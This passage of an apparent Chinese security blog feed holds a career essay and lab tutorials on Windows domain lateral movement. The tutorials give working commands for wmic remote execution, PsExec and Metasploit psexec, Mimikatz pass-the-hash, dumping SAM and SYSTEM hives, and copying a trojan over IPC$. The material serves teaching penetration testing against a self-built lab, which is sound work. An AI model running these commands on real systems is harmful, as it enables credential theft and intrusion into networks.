    <id>http://sherlocz.github.io/2020/02/15/CVE-2018-4878-Flash漏洞复现/</id>
    <published>2020-02-15T06:02:03.000Z</published>
    <updated>2020-02-15T06:03:12.931Z</updated>
    
    <content type="html"><![CDATA[<p>最近做项目要自闭了，啥漏洞都挖不出来，太菜了，哎~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做项目要自闭了，啥漏洞都挖不出来，太菜了，哎~&lt;/p&gt;

      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>对于乙方安全职业发展方向的思考</title>
    <link href="http://sherlocz.github.io/2020/02/08/%E5%AF%B9%E4%BA%8E%E4%B9%99%E6%96%B9%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E5%8F%91%E5%B1%95%E6%96%B9%E5%90%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>http://sherlocz.github.io/2020/02/08/对于乙方安全职业发展方向的思考/</id>
    <published>2020-02-08T13:05:15.000Z</published>
    <updated>2020-02-08T14:11:33.852Z</updated>
    
    <content type="html"><![CDATA[<p>学了安全一段时间了，也工作了一段时间，接触过很多很多厉害的人，有社工特别厉害的，有APT的大佬，有审计的大佬，有免杀的大佬，也有做黑产的，在这么多方向中其实还并没有找到自己发展的一个方向，其实看啥都想学点，但是总体来说感觉并没有沉淀下来的技术，对于走技术方向的安全从业人员来说，必须得有个自身立足的优势。</p><p>所以这里就结合自己最近半年接触过的一些岗位，面试经历，讲讲我认知中乙方安全技术上发展的几个方向。</p><h1 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h1><h2 id="安全服务"><a href="#安全服务" class="headerlink" title="安全服务"></a>安全服务</h2><p>这是出入安全门槛相对比较低的一个岗位，平时的工作离不开<strong>等级保护、基线核查、渗透测试、网络等</strong>，做的工作内容相对杂一些。</p><p>对技术上的要求并不高，但是你对整个安全市场会有更多的了解，技术上其实你只要能挖挖洞，能讲清楚漏洞原理就OK。技术上的提升是横向的，并不会对某个领域有着过分的要求，就算你哪一块特别的厉害，公司基本上也不会有这样的需求，能够干活就对了。</p><h2 id="红蓝对抗"><a href="#红蓝对抗" class="headerlink" title="红蓝对抗"></a>红蓝对抗</h2><p>红队的工作相对来说其实相当于高级安全服务工程师，或者说是渗透测试工程师，但是没有安全服务那么杂，基本上就是单纯的渗透、拿站、想尽一切办法进行攻击，除去了等级保护以及一些杂七杂八的东西。</p><p>技术上的要求会高很多，你的知识面得足够广，并且在数个或者一个领域有着较为深入的研究和了解，以及一定量项目的经验。在这条方向上你的技能会提升的很多，很快，也是很多安全从业人员向往的工作方向吧。</p><h2 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h2><p>APT就叫做高级可持续威胁攻击，拿到的项目更加的大、复杂，渗透的周期会很长，感觉这个方向都是去做国安的项目，比方说国家投资的一些APT队伍，或者民间的一些自行组织的黑客团队，攻击的都是某个国家的站点、内网、医疗机构、金融机构，大型企业。</p><p>对于技术的要求会更高，而且想要拿下并不容易，可能几个月甚至半年数年都得盯着某个特定的目标，寻找出资产中的脆弱点进行攻击、社会工程攻击等。</p><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><p>主要的工作基本上就是关注0day、攻击事件，但是没有接触过这样的团队，很多小乙方安全公司的安全工程师其实也是兼职这个小方向的。只有大厂才能养活这样的团队。</p><p>第一时间拿到这个情报是很值钱的，帮助企业在安全运营中，利用威胁情报快速检测、响应、分析和预防各类网络攻击威胁，并分析产生行业威胁情报。对于一些被攻击的公司或者潜在的攻击对象来说，市场是很大的。</p><h2 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h2><p>看过很多出来单干的全职挖SRC的高手，有写扫面器发家致富的，也有批量刷SRC的，对于国内一些大厂SRC，其实每年也就那么几个人挖，毕竟奖金会特别的丰厚，也能提高自身的知名度，能够做到这样的人少之甚少，是一个小圈子内进行的项目，毕竟这个方向全职每年少说也能赚几十万呐。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计的语言有很多种，市面上的招聘一般就会招聘PHP、JAVA或者GO于言的工程师，工作也就是进行拿项目进行代码审计，最后产出。</p><p>不过不同的语言他的特性不一样，框架不一样，你所需要花费的时间就会特别多，而且最好是开发转审计，接触过的好几个审计的大牛都是开发出身的。</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>内网渗透也包含在后渗透当中，能够接触到内网渗透的安全人员相对来说少很多，而很多的项目也是直接从内网开始的，公司有了这样的需求肯定要招聘，不过数目也是挺少的。</p><h2 id="安全研究"><a href="#安全研究" class="headerlink" title="安全研究"></a>安全研究</h2><p>安全研究能分成很多块，但是首先得说说产出的问题。<br>对于这样的岗位，只有极少数的互联网大厂和大型的乙方安全公司才有这样的团队，小公司这样的安全研究能力都是扯几把蛋的。当公司预算不足的时候，这样的团队也是首先得裁掉的对象之一。</p><p>除非你是天才，对于安全领域有着超高的悟性或者年少有为，才能去向这个方向发展，否则你研究出来的东西本身就没几个人懂，无法为公司提出那个高的价值，这样的方向我认为是没有意义的，当然要是你能做到，说明你的技术确实非常突出了。</p><p>web方向的研究领域：代码审计、内网渗透、免杀、钓鱼、前端安全、数据库安全等等</p><p>当然也有招代码审计工程师或者内网渗透工程师的，我并没有把它放在安全研究领域，因为这样的岗位依然以输出为主，并非纯粹的安全研究。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然，如上提到的都只是安全领域中的很小一部分，会有一些其他的方向没拿出来说，这些也只是我浅薄认知中认识的乙方安全，对于自身要走的方向或者技能栈，看自身的选择吧，当然要是周围有这样的大牛就直接舔，毕竟安全也是一个很吃情报的行业，很多东西都不会在市面上分享出来呀。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学了安全一段时间了，也工作了一段时间，接触过很多很多厉害的人，有社工特别厉害的，有APT的大佬，有审计的大佬，有免杀的大佬，也有做黑产的，在这么多方向中其实还并没有找到自己发展的一个方向，其实看啥都想学点，但是总体来说感觉并没有沉淀下来的技术，对于走技术方向的安全从业人员来
      
    
    </summary>
    
    
    
      <category term="思考" scheme="http://sherlocz.github.io/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>利用wmi进行横向渗透</title>
    <link href="http://sherlocz.github.io/2020/02/05/%E5%88%A9%E7%94%A8wmi%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
    <id>http://sherlocz.github.io/2020/02/05/利用wmi进行横向渗透/</id>
    <published>2020-02-05T12:33:32.000Z</published>
    <updated>2020-02-05T13:01:56.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>wmi为windows内置的工具，可将系统命令执行的结果写入磁盘中，配合type命令远程读取，这样可以远程写马？</p><p>缺点：无回显<br>优点：不容易被发现</p><h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>靶机：win7<br>目标机器：windows server 2012(DC)</p><p>在win7下面进行命令行操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.43.100 /user:administrator /password:Ms0806</span><br><span class="line">7 process call create &quot;cmd.exe /c ipconfig &gt; C:\ip.txt&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/05/利用wmi进行横向渗透/wmic.png" alt></p><p>然后建立ipc连接，利用type命令访问文件</p><p><img src="/2020/02/05/利用wmi进行横向渗透/ipc.png" alt><br><img src="/2020/02/05/利用wmi进行横向渗透/type.png" alt></p><p>达到执行命令的效果</p><p>不过这样执行比较麻烦，这里可以推荐一个脚本<br><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></p><p>使用方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py admin:password@ip [command]</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WMI&quot;&gt;&lt;a href=&quot;#WMI&quot; class=&quot;headerlink&quot; title=&quot;WMI&quot;&gt;&lt;/a&gt;WMI&lt;/h1&gt;&lt;p&gt;wmi为windows内置的工具，可将系统命令执行的结果写入磁盘中，配合type命令远程读取，这样可以远程写马？&lt;/p&gt;
&lt;p&gt;缺点
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>利用PsExec进行横向渗透</title>
    <link href="http://sherlocz.github.io/2020/02/04/%E5%88%A9%E7%94%A8PsExec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
    <id>http://sherlocz.github.io/2020/02/04/利用PsExec进行横向渗透/</id>
    <published>2020-02-04T09:44:00.000Z</published>
    <updated>2020-02-04T11:30:38.962Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul><li>需要目标机器开启了ADMIN$共享(默认开启)</li><li>建立了IPC连接，可以不输入账号密码连接到CMD窗口</li></ul><p>下载地址:<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>优点：可直接获取SYSTEM权限的交互式shell<br>缺点：利用时会产生一个Psecex的服务，这个服务会产生日志文件，容易溯源</p><h1 id="模拟利用过程"><a href="#模拟利用过程" class="headerlink" title="模拟利用过程"></a>模拟利用过程</h1><ul><li>Win Server 2012 R2(DC)</li><li>Win 7(域中的一台机器)</li></ul><h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><p>我们现在用Win7去攻击域控，在win7下cmd</p><p>首先看看ip<br><img src="/2020/02/04/利用PsExec进行横向渗透/ipconfig.png" alt><br>没发现域控在那台机器，win7的ip是192.168.43.102<br><img src="/2020/02/04/利用PsExec进行横向渗透/domain.png" alt><br>查看域<br><img src="/2020/02/04/利用PsExec进行横向渗透/hacke.png" alt><br>查看域内其他主机<br><img src="/2020/02/04/利用PsExec进行横向渗透/nslookup.png" alt><br>利用nslookup定位DC</p><p>这里我并未对DC做设置，所以默认的时候ADMIN$是共享状态，你也可以使用net share命令查看共享的资源</p><h2 id="无IPC连接"><a href="#无IPC连接" class="headerlink" title="无IPC连接"></a>无IPC连接</h2><p>我们在win7的机器上查看了解情况，若无共享的连接，则我们在使用PsExec的时候需要使用账号密码进行验证<br><img src="/2020/02/04/利用PsExec进行横向渗透/use.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 -u username -p password</span><br></pre></td></tr></table></figure><p><img src="/2020/02/04/利用PsExec进行横向渗透/none.png" alt><br>无需弹出新的cmd窗口，直接拿下域控</p><h2 id="有IPC连接"><a href="#有IPC连接" class="headerlink" title="有IPC连接"></a>有IPC连接</h2><p><img src="/2020/02/04/利用PsExec进行横向渗透/yes.png" alt></p><p>这个时候无需验证账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 cmd.exe</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/04/利用PsExec进行横向渗透/2.png" alt><br>成功啦~</p><h2 id="Msf中的Psexec模块"><a href="#Msf中的Psexec模块" class="headerlink" title="Msf中的Psexec模块"></a>Msf中的Psexec模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOST 192.168.43.100</span><br><span class="line">set smbuser usernmae</span><br><span class="line">set smbpass password</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2020/02/04/利用PsExec进行横向渗透/msf.png" alt></p><p>这样就利用成功了</p><p>总的来说这个psexec利用的方式就是，只要服务器上面有连接的IPC，就可以搞出cmd。</p><p>差不多就这样吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;需要目标机器开启了ADMIN$共享(默认开启)&lt;/li&gt;
&lt;li&gt;建立了IPC连接，可以不输入账号密码连接到CM
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hash传递相关知识点</title>
    <link href="http://sherlocz.github.io/2020/02/03/Hash%E4%BC%A0%E9%80%92%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>http://sherlocz.github.io/2020/02/03/Hash传递相关知识点/</id>
    <published>2020-02-03T07:09:28.000Z</published>
    <updated>2020-02-03T09:18:40.506Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PTH介绍"><a href="#PTH介绍" class="headerlink" title="PTH介绍"></a>PTH介绍</h1><p>当我们拿到一台服务器的SYSTEM权限之后，利用工具获取到了服务器的HASH值，但是无法抓取到明文密码或者密文解不开，这个时候我们可以尝试进行Pass The Hash(Hash传递)进行横向的渗透攻击</p><h1 id="利用mimikatz进行pth"><a href="#利用mimikatz进行pth" class="headerlink" title="利用mimikatz进行pth"></a>利用mimikatz进行pth</h1><p><img src="/2020/02/03/Hash传递相关知识点/ntlm.png" alt><br>这里的实验机器是windows server 2012 r2(dc)，发现并没有抓取到明文，这个密文设置的密码也解不出来，注意这里的SID为500.</p><p>然后接着在攻击机器上(在域控中的机器)mimikatz中输入如下的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:domainname /ntlm:519c985a849313d2c8029b293b57de1f</span><br></pre></td></tr></table></figure></p><p>效果是这个样子的，然后他会弹出一个新的cmd窗口<br><img src="/2020/02/03/Hash传递相关知识点/mimikatz.png" alt></p><p>这种方式会感觉有些鸡肋，为什么呢，因为弹出新的cmd窗口，你得登上域内的一台3389才能利用这种方式啊，要是登不上域内的远程桌面，命令行下这种方式不行，就像win10的bypass uac一样，不是很喜欢这种弹出新框框的东西 :)</p><h1 id="利用msf进行pth"><a href="#利用msf进行pth" class="headerlink" title="利用msf进行pth"></a>利用msf进行pth</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.15.181</span><br><span class="line">set SMBUser rabbitmask</span><br><span class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4</span><br></pre></td></tr></table></figure><p><img src="/2020/02/03/Hash传递相关知识点/msf.png" alt><br>不过这里注意一下HASH的值，mimikatz只需要ntlm就能进行传递，msf的这个模块需要LM:NTLM HASH<br><img src="/2020/02/03/Hash传递相关知识点/hash.png" alt><br>就是这个样子的</p><h1 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h1><p>微软在2014年5月份发布的这个KB2871997补丁，禁止了本地管理员账户对远程计算机进行了解，所以我们无法使用psexec、wni、smbexec、schtasks、at等命令对远程主机进行操作，也无法使用PTH方法进行横向渗透，但是唯独SID为500的账号可以使用PTH去横向，这个账号去进行PTH不受到该补丁的影响。</p><p>一般在域环境下SID为500的DC就是域控账号了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PTH介绍&quot;&gt;&lt;a href=&quot;#PTH介绍&quot; class=&quot;headerlink&quot; title=&quot;PTH介绍&quot;&gt;&lt;/a&gt;PTH介绍&lt;/h1&gt;&lt;p&gt;当我们拿到一台服务器的SYSTEM权限之后，利用工具获取到了服务器的HASH值，但是无法抓取到明文密码或者密文解不开
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH</title>
    <link href="http://sherlocz.github.io/2020/02/02/%E4%BD%BF%E7%94%A8Mimikatz%E8%AF%BB%E5%8F%96SAM%E5%92%8CSYSTEM%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84NTLM-HASH/"/>
    <id>http://sherlocz.github.io/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/</id>
    <published>2020-02-02T07:39:51.000Z</published>
    <updated>2020-02-02T08:00:37.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先导出两个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/1.png" alt><br>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/2.png" alt><br>运行mimikatz，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/ntlm.png" alt><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="/2020/02/02/使用Mimikatz读取SAM和SYSTEM文件中的NTLM-HASH/123456.png" alt></p><p>解不出来，尝试hash传递吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;使用场景&quot;&gt;&lt;a href=&quot;#使用场景&quot; class=&quot;headerlink&quot; title=&quot;使用场景&quot;&gt;&lt;/a&gt;使用场景&lt;/h1&gt;&lt;p&gt;已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和S
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>利用IPC进行横向渗透</title>
    <link href="http://sherlocz.github.io/2020/02/01/%E5%88%A9%E7%94%A8IPC%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
    <id>http://sherlocz.github.io/2020/02/01/利用IPC进行横向渗透/</id>
    <published>2020-02-01T11:07:34.000Z</published>
    <updated>2020-02-01T13:23:06.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IPC利用条件"><a href="#IPC利用条件" class="headerlink" title="IPC利用条件"></a>IPC利用条件</h1><p>服务器开启了139或者445端口，可以利用IPC$连接，获取目标主机上的目录结构、用户信息等等。</p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>首先我们看当前IPC连接记录，这里的记录是空的，说明占时没有链接<br><img src="/2020/02/01/利用IPC进行横向渗透/1.png" alt></p><p>现在我们建立一个完整的连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\127.0.0.1\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/2.png" alt><br>这个时候我们再net view，发现成功建立连接<br><img src="/2020/02/01/利用IPC进行横向渗透/3.png" alt></p><p>然后可以将目标机器的磁盘映射出来，这里我把目标机器的C盘映射到了本机的F盘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use F: \\127.0.0.1\c$ &quot;密码&quot; /user:&quot;用户名&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/4.png" alt><br><img src="/2020/02/01/利用IPC进行横向渗透/5.png" alt></p><p>查看下目标机器的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /s 192.168.43.100 /u username /p password</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/6.png" alt></p><p>利用copy命令将我们构造好的木马程序复制到目标机器上面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy ccc.exe \\192.168.43.100\C$</span><br><span class="line"></span><br><span class="line">dir \\192.168.43.100\C&amp;</span><br></pre></td></tr></table></figure></p><p>然后怎么玩就看思路了</p><p>这个ipc的利用前提也是要有目标服务器的账号密码或者账号为空的情况下才能进去，有了账号密码可以直接3389了吧，哈哈哈</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;IPC利用条件&quot;&gt;&lt;a href=&quot;#IPC利用条件&quot; class=&quot;headerlink&quot; title=&quot;IPC利用条件&quot;&gt;&lt;/a&gt;IPC利用条件&lt;/h1&gt;&lt;p&gt;服务器开启了139或者445端口，可以利用IPC$连接，获取目标主机上的目录结构、用户信息等等。&lt;/
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="后渗透" scheme="http://sherlocz.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>简单的域环境搭建</title>
    <link href="http://sherlocz.github.io/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://sherlocz.github.io/2020/01/31/简单的域环境搭建/</id>
    <published>2020-01-31T14:16:55.000Z</published>
    <updated>2020-01-31T15:57:26.800Z</updated>
    
    <content type="html"><![CDATA[<p>环境</p><ul><li>Windows server 2012(DC)</li><li>Windows server 2008</li><li>Windows7</li></ul><h1 id="配置DC服务器"><a href="#配置DC服务器" class="headerlink" title="配置DC服务器"></a>配置DC服务器</h1><p>这里用windows server 2012作为域控服务器，首先我们修改网络，这里我们自定义ip，并将DNS设为2012本机(一般域控也作为DNS服务器)<br><img src="/2020/01/31/简单的域环境搭建/network12.png" alt></p><p>然后我们在服务器管理里面，点击 <strong>添加角色和功能</strong><br><img src="/2020/01/31/简单的域环境搭建/121.png" alt></p><p>第一页是导向，我们不管点击下一步。</p><p>安装类型我们就选择默认的就好。<br><img src="/2020/01/31/简单的域环境搭建/122.png" alt></p><p>服务器选择，我们这里占时就一台服务器，我们点击下一步就好<br><img src="/2020/01/31/简单的域环境搭建/123.png" alt></p><p>服务器角色，我们选择安装 <strong>Active Directory域服务</strong> 和 <strong>DNS服务器</strong><br><img src="/2020/01/31/简单的域环境搭建/124.png" alt></p><p>后面的步骤就一路默认就行，最后点击安装。<br><img src="/2020/01/31/简单的域环境搭建/126.png" alt><br><img src="/2020/01/31/简单的域环境搭建/127.png" alt></p><p>这里安装完毕之后，在服务器管理器的页面中点击右上方的小黄旗，然后我们要将这台服务器提升为域控服务器<br><img src="/2020/01/31/简单的域环境搭建/128.png" alt></p><p>点击之后 部署配置这里我们操作为 <strong>添加新林</strong>，然后我们要设置根域名，也就是域名，这里设置成 <strong>hacke.testlab</strong><br><img src="/2020/01/31/简单的域环境搭建/1210.png" alt></p><p>域控制器选项这里填写好密码，后面的操作默认就好。</p><p>上面所有的步骤进行完了之后，重启，然后命令行下输入net view，出现了错误<br><img src="/2020/01/31/简单的域环境搭建/error.png" alt></p><p>解决方式：将Computer Browser服务启动就行<br><img src="/2020/01/31/简单的域环境搭建/solution.png" alt></p><p>我们这里再输入命令，当我们看到HACKE这个域的时候，就说明已经配置ok了<br><img src="/2020/01/31/简单的域环境搭建/solution.png" alt></p><h1 id="配置域内其他服务器"><a href="#配置域内其他服务器" class="headerlink" title="配置域内其他服务器"></a>配置域内其他服务器</h1><p>这里我用08举例子<br><img src="/2020/01/31/简单的域环境搭建/08.png" alt></p><p>ip设为固定ip，DNS指向我们的域控服务器。</p><p>计算机名我们自行修改，然后下方选择加入的域(这里会要认证域管理权限的账号)</p><p>然后关闭域网络中的防火墙</p><p>所有配置好之后，cmd下运行<br><img src="/2020/01/31/简单的域环境搭建/07.png" alt></p><p>这里就能看见，这个hacke域下所有的机器了</p><p>当你运行命令之后回显成这样，就说明域环境配置成功啦</p><h1 id="net-view"><a href="#net-view" class="headerlink" title="net view"></a>net view</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br><span class="line">#查看局域网内的域控</span><br><span class="line"></span><br><span class="line">net view /domain:domainname</span><br><span class="line">#查看domainname域中的主机</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;环境&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows server 2012(DC)&lt;/li&gt;
&lt;li&gt;Windows server 2008&lt;/li&gt;
&lt;li&gt;Windows7&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;配置DC服务器&quot;&gt;&lt;a href=&quot;#配置DC服务器&quot; cla
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
